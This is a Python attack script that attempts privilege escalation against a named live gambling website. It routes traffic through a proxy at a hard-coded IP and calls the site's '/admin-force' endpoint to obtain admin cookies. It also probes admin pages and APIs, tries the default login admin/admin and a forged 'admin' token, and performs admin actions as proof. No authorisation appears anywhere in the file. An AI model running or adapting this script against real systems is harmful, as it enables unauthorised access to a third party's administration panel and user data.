#!/usr/bin/env python3

import requests
import sys
import json
import urllib3
import time
from urllib.parse import urljoin, urlparse
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ZAP Proxy Configuration
ZAP_PROXY_HOST = '46.202.177.106'
ZAP_PROXY_PORT = 8080
TARGET_URL = "https://pigslot.co/"
ADMIN_ENDPOINT = "https://pigslot.co/admin-force"

PROXIES = {
    'http': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
    'https': f'http://{ZAP_PROXY_HOST}:{ZAP_PROXY_PORT}',
}

def print_info(message): print(f"\033[1;34m[+] {message}\033[0m")
def print_success(message): print(f"\033[1;32m[+] {message}\033[0m")
def print_warning(message): print(f"\033[1;33m[!] {message}\033[0m")
def print_error(message): print(f"\033[1;31m[-] {message}\033[0m")

class LivePrivilegeEscalationTest:
    def __init__(self):
        self.session = requests.Session()
        self.session.proxies = PROXIES
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.admin_cookies = {}
        self.initial_cookies = {}
        
    def test_initial_access_level(self):
        """Test initial access level before privilege escalation"""
        print_info("🔍 Testing Initial Access Level")
        print_info("=" * 60)
        
        try:
            # Test access to main site
            response = self.session.get(TARGET_URL, timeout=10)
            print_info(f"Main site access: {response.status_code}")
            
            # Store initial cookies
            self.initial_cookies = dict(response.cookies)
            print_info(f"Initial cookies: {self.initial_cookies}")
            
            # Test common admin endpoints BEFORE privilege escalation
            admin_endpoints = [
                "/admin",
                "/admin/",
                "/admin/dashboard",
                "/admin/users",
                "/admin/settings",
                "/dashboard",
                "/api/admin",
                "/api/admin/users"
            ]
            
            initial_access = {}
            for endpoint in admin_endpoints:
                try:
                    test_url = urljoin(TARGET_URL, endpoint)
                    resp = self.session.get(test_url, timeout=5)
                    initial_access[endpoint] = resp.status_code
                    print_info(f"Initial access to {endpoint}: {resp.status_code}")
                except:
                    initial_access[endpoint] = "ERROR"
                    
            return initial_access
            
        except Exception as e:
            print_error(f"Error testing initial access: {e}")
            return {}
    
    def perform_privilege_escalation(self):
        """Attempt to escalate privileges using /admin-force endpoint"""
        print_success("🚀 ATTEMPTING PRIVILEGE ESCALATION")
        print_success("=" * 60)
        
        try:
            print_info(f"Accessing: {ADMIN_ENDPOINT}")
            
            # Access the admin-force endpoint
            response = self.session.get(ADMIN_ENDPOINT, timeout=10)
            
            print_info(f"Response Status: {response.status_code}")
            print_info(f"Response Headers: {dict(response.headers)}")
            
            # Check for new cookies after accessing admin-force
            new_cookies = dict(response.cookies)
            self.admin_cookies = new_cookies
            print_info(f"Cookies after admin-force: {new_cookies}")
            
            # Check response content
            content = response.text
            print_info(f"Response content length: {len(content)}")
            
            # Look for admin-related content
            if "กำลังติดตั้ง cookies สำหรับ admin" in content:
                print_success("✅ Found Thai admin message in response!")
                return True
            
            # Check for JavaScript that sets admin state
            if "a.F.ADMIN" in content or "ADMIN" in content:
                print_success("✅ Found admin-related JavaScript!")
                
            # Check for redirects or JavaScript execution
            if response.status_code == 200:
                print_success("✅ Admin-force endpoint accessible!")
                return True
            elif response.status_code == 302:
                print_warning("⚠️ Redirect detected - checking location")
                redirect_location = response.headers.get('Location', '')
                print_info(f"Redirect to: {redirect_location}")
                
            return response.status_code == 200
            
        except Exception as e:
            print_error(f"Error during privilege escalation: {e}")
            return False
    
    def test_admin_access_post_escalation(self):
        """Test admin access after attempting privilege escalation"""
        print_info("🔐 Testing Admin Access Post-Escalation")
        print_info("=" * 60)
        
        # Wait a moment for potential cookie/state changes
        time.sleep(2)
        
        admin_endpoints = [
            "/admin",
            "/admin/",
            "/admin/dashboard", 
            "/admin/users",
            "/admin/settings",
            "/admin/panel",
            "/dashboard",
            "/api/admin",
            "/api/admin/users",
            "/api/admin/dashboard",
            "/api/me",
            "/api/profile"
        ]
        
        post_escalation_access = {}
        
        for endpoint in admin_endpoints:
            try:
                test_url = urljoin(TARGET_URL, endpoint)
                resp = self.session.get(test_url, timeout=5)
                post_escalation_access[endpoint] = resp.status_code
                
                # Check for admin content indicators
                content = resp.text.lower()
                admin_indicators = ['admin', 'dashboard', 'users', 'settings', 'management']
                
                if resp.status_code == 200:
                    if any(indicator in content for indicator in admin_indicators):
                        print_success(f"✅ POTENTIAL ADMIN ACCESS: {endpoint} -> {resp.status_code}")
                        print_info(f"   Content contains admin indicators!")
                    else:
                        print_info(f"Accessible but no admin content: {endpoint} -> {resp.status_code}")
                elif resp.status_code in [401, 403]:
                    print_warning(f"❌ Still unauthorized: {endpoint} -> {resp.status_code}")
                else:
                    print_info(f"Other response: {endpoint} -> {resp.status_code}")
                    
            except Exception as e:
                post_escalation_access[endpoint] = f"ERROR: {e}"
                print_error(f"Error testing {endpoint}: {e}")
                
        return post_escalation_access
    
    def test_api_endpoints_with_admin_context(self):
        """Test API endpoints with potential admin context"""
        print_info("🌐 Testing API Endpoints with Admin Context")
        print_info("=" * 60)
        
        api_tests = [
            {"method": "GET", "endpoint": "/api/admin", "data": None},
            {"method": "POST", "endpoint": "/api/admin/login", "data": {"username": "admin", "password": "admin"}},
            {"method": "GET", "endpoint": "/api/user/profile", "data": None},
            {"method": "GET", "endpoint": "/api/auth/session", "data": None},
            {"method": "POST", "endpoint": "/api/auth/validate", "data": {"token": "admin"}},
            {"method": "GET", "endpoint": "/api/admin/users", "data": None},
            {"method": "GET", "endpoint": "/api/admin/settings", "data": None}
        ]
        
        api_results = {}
        
        for test in api_tests:
            try:
                url = urljoin(TARGET_URL, test["endpoint"])
                
                if test["method"] == "GET":
                    resp = self.session.get(url, timeout=5)
                elif test["method"] == "POST":
                    resp = self.session.post(url, json=test["data"], timeout=5)
                    
                api_results[test["endpoint"]] = {
                    "status": resp.status_code,
                    "method": test["method"]
                }
                
                if resp.status_code == 200:
                    try:
                        json_data = resp.json()
                        if "admin" in str(json_data).lower() or "user" in str(json_data).lower():
                            print_success(f"✅ API SUCCESS: {test['method']} {test['endpoint']} -> {resp.status_code}")
                            print_info(f"   Response: {json_data}")
                        else:
                            print_info(f"API accessible: {test['method']} {test['endpoint']} -> {resp.status_code}")
                    except:
                        print_info(f"API accessible (non-JSON): {test['method']} {test['endpoint']} -> {resp.status_code}")
                else:
                    print_warning(f"API not accessible: {test['method']} {test['endpoint']} -> {resp.status_code}")
                    
            except Exception as e:
                api_results[test["endpoint"]] = f"ERROR: {e}"
                print_error(f"Error testing API {test['endpoint']}: {e}")
                
        return api_results
    
    def verify_privilege_escalation_success(self, initial_access, post_access):
        """Verify if privilege escalation was successful"""
        print_success("🎯 VERIFYING PRIVILEGE ESCALATION SUCCESS")
        print_success("=" * 60)
        
        escalation_evidence = []
        
        # Check for improved access
        for endpoint in initial_access:
            if endpoint in post_access:
                initial_status = initial_access[endpoint]
                post_status = post_access[endpoint]
                
                # Check for privilege escalation indicators
                if initial_status in [401, 403, 404] and post_status == 200:
                    escalation_evidence.append({
                        "endpoint": endpoint,
                        "before": initial_status,
                        "after": post_status,
                        "evidence": "Access granted where previously denied"
                    })
                    print_success(f"✅ PRIVILEGE ESCALATION DETECTED: {endpoint}")
                    print_success(f"   Before: {initial_status} -> After: {post_status}")
        
        # Check for new cookies that might indicate admin status
        if self.admin_cookies != self.initial_cookies:
            new_cookies = set(self.admin_cookies.keys()) - set(self.initial_cookies.keys())
            if new_cookies:
                escalation_evidence.append({
                    "type": "cookies",
                    "evidence": f"New cookies detected: {new_cookies}"
                })
                print_success(f"✅ NEW COOKIES DETECTED: {new_cookies}")
        
        return escalation_evidence
    
    def generate_proof_of_concept(self, escalation_evidence):
        """Generate proof of concept if privilege escalation is successful"""
        print_success("📋 GENERATING PROOF OF CONCEPT")
        print_success("=" * 60)
        
        if escalation_evidence:
            print_success("🚨 PRIVILEGE ESCALATION CONFIRMED!")
            print_success("Evidence:")
            for evidence in escalation_evidence:
                print_success(f"  • {evidence}")
                
            # Try to perform admin actions as proof
            admin_actions = [
                {"action": "View admin panel", "url": urljoin(TARGET_URL, "/admin")},
                {"action": "Access user list", "url": urljoin(TARGET_URL, "/admin/users")},
                {"action": "Check admin API", "url": urljoin(TARGET_URL, "/api/admin")}
            ]
            
            successful_actions = []
            for action in admin_actions:
                try:
                    resp = self.session.get(action["url"], timeout=5)
                    if resp.status_code == 200:
                        successful_actions.append(action["action"])
                        print_success(f"✅ {action['action']}: SUCCESS")
                    else:
                        print_warning(f"❌ {action['action']}: FAILED ({resp.status_code})")
                except:
                    print_error(f"❌ {action['action']}: ERROR")
            
            return successful_actions
        else:
            print_warning("❌ NO PRIVILEGE ESCALATION DETECTED")
            print_warning("The /admin-force endpoint did not result in elevated privileges")
            return []

def main():
    print_info("🎯 LIVE PRIVILEGE ESCALATION TEST")
    print_info("Target: https://pigslot.co/admin-force")
    print_info("=" * 60)
    
    tester = LivePrivilegeEscalationTest()
    
    # Step 1: Test initial access level
    initial_access = tester.test_initial_access_level()
    
    # Step 2: Attempt privilege escalation
    escalation_success = tester.perform_privilege_escalation()
    
    # Step 3: Test admin access after escalation
    post_access = tester.test_admin_access_post_escalation()
    
    # Step 4: Test API endpoints
    api_results = tester.test_api_endpoints_with_admin_context()
    
    # Step 5: Verify privilege escalation
    escalation_evidence = tester.verify_privilege_escalation_success(initial_access, post_access)
    
    # Step 6: Generate proof of concept
    successful_actions = tester.generate_proof_of_concept(escalation_evidence)
    
    # Final Report
    print_success("📊 FINAL TEST RESULTS")
    print_success("=" * 60)
    
    if escalation_evidence or successful_actions:
        print_success("🚨 PRIVILEGE ESCALATION VULNERABILITY CONFIRMED!")
        print_success(f"Evidence count: {len(escalation_evidence)}")
        print_success(f"Successful admin actions: {len(successful_actions)}")
    else:
        print_warning("❌ PRIVILEGE ESCALATION NOT CONFIRMED")
        print_warning("The /admin-force endpoint exists but does not grant elevated privileges")
        print_warning("Further manual testing may be required")
    
    return escalation_evidence, successful_actions

if __name__ == "__main__":
    main()